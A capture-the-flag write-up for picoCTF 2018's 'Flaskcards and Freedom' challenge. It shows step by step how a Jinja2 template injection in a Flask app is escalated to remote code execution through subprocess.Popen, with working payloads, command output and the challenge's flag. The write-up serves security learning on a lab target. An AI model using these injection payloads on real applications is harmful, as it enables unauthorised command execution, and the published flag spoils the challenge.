# Flaskcards and Freedom
Web Exploitation - 900 points

## Challenge 
> There seem to be a few more files stored on the flash card server but we can't login. Can you? http://2018shell2.picoctf.com:58184 (link)

## Hint
> There's more to the original vulnerability than meets the eye.

> Can you leverage the injection technique to get remote code execution?

> Sorry, but the database still reverts every 2 hours.


## Solution

Similar to [Flaskcards](../../Solved/Flaskcards), this is vulnerable to code injection from the "Create Card" page and viewing it in "List Cards".

Now looking at these rather interesting website, it is possible to start reading any file in the directory.

- https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html
- https://twitter.com/_qll_/status/707714873774448640
- https://nvisium.com/blog/2015/12/07/injecting-flask.html

---

First, load all the accessible classes using this payload

	{{''.__class__.mro()[1].__subclasses__()}} 

We notice that the class subprocess.Popen() is in the list. Hence, we can use it to execute some shell commands!

Next, search through the array for the index of `<class 'subprocess.Popen'>`. In my case, it is index 471 and I verified it with this payload.

	{{''.__class__.mro()[1].__subclasses__()[471]}}

Now we can execute some commands with this payload such as `ls`

	{{''.__class__.mro()[1].__subclasses__()[471]('ls',shell=True).communicate()}}

However, it returns `None`, so we need to pipe the results back to python using `stdout=subprocess.PIPE`. 

---

Also note that we don't have access to subprocess module. I had to use integer value of `subprocess.PIPE` which is `-1` to get it working.

	{{''.__class__.mro()[1].__subclasses__()[471]('ls',shell=True, stdout=-1).communicate()}}

And behold, we see the contents

	Question:(b'app\nflag\nserver.py\nxinet_startup.sh\n', None)

---

Now, let's cat the flag

	{{''.__class__.mro()[1].__subclasses__()[471]('cat flag',shell=True, stdout=-1).communicate()}}

And we are done

	Question:(b'picoCTF{R_C_E_wont_let_me_be_04eedee8}', None)

## Flag

	picoCTF{R_C_E_wont_let_me_be_04eedee8}
